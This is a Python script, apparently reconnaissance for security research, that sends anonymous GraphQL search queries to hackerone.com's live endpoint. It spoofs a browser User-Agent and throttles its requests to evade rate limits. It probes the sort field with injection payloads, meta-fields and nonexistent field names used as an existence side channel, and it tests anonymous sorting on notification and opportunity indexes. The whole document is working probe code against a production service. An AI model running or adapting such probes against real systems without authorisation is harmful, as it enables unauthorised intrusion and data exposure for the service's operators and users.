# -*- coding: utf-8 -*-
"""限流恢复探测 + sort field 注入判别(匿名,慢速)"""
import sys, io, json, time
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
import requests, urllib3
urllib3.disable_warnings()
s = requests.Session()
s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36'})

def probe(name, qstr, timeout=20):
    t0 = time.time()
    try:
        r = s.post('https://hackerone.com/graphql', json={'query': qstr}, timeout=timeout)
        dt = round(time.time() - t0, 1)
        body = r.text.replace('\n', ' ')[:280]
        print(f'--- {name} [{r.status_code} {dt}s] {body}')
    except Exception as e:
        print(f'--- {name} ERR {type(e).__name__}: {e}')
    time.sleep(2.5)

# 0. 探测是否仍限流
probe('probe', '{ search(index: CompleteHacktivityReportIndex, query_string: "IDOR", limit: 1) { total_count } }')
# 1. sort field 正常对照
probe('sort_title', '{ search(index: CompleteHacktivityReportIndex, query_string: "*", sort: { field: "title", direction: ASC }, limit: 1) { total_count } }')
# 2. sort 元字段
probe('sort_score', '{ search(index: CompleteHacktivityReportIndex, query_string: "*", sort: { field: "_score", direction: DESC }, limit: 1) { total_count } }')
probe('sort_id', '{ search(index: CompleteHacktivityReportIndex, query_string: "*", sort: { field: "_id", direction: ASC }, limit: 1) { total_count } }')
# 3. sort 不存在字段(存在性侧信道)
probe('sort_bogus', '{ search(index: CompleteHacktivityReportIndex, query_string: "*", sort: { field: "zzz_nonexistent_9f3k", direction: ASC }, limit: 1) { total_count } }')
# 4. sort 内嵌语法/注入载荷
probe('sort_quote', '{ search(index: CompleteHacktivityReportIndex, query_string: "*", sort: { field: "title desc", direction: ASC }, limit: 1) { total_count } }')
probe('sort_paren', '{ search(index: CompleteHacktivityReportIndex, query_string: "*", sort: { field: "title}", direction: ASC }, limit: 1) { total_count } }')
# 5. sort 在 NotificationsIndex(不同映射——匿名应 0/拒绝)
probe('sort_notif', '{ search(index: NotificationsIndex, query_string: "*", sort: { field: "id", direction: ASC }, limit: 1) { total_count } }')
# 6. sort 在 OpportunitiesIndex
probe('sort_opp', '{ search(index: OpportunitiesIndex, query_string: "*", sort: { field: "handle", direction: ASC }, limit: 1) { total_count } }')
probe('sort_opp_bogus', '{ search(index: OpportunitiesIndex, query_string: "*", sort: { field: "zzz_nonexistent_9f3k", direction: ASC }, limit: 1) { total_count } }')
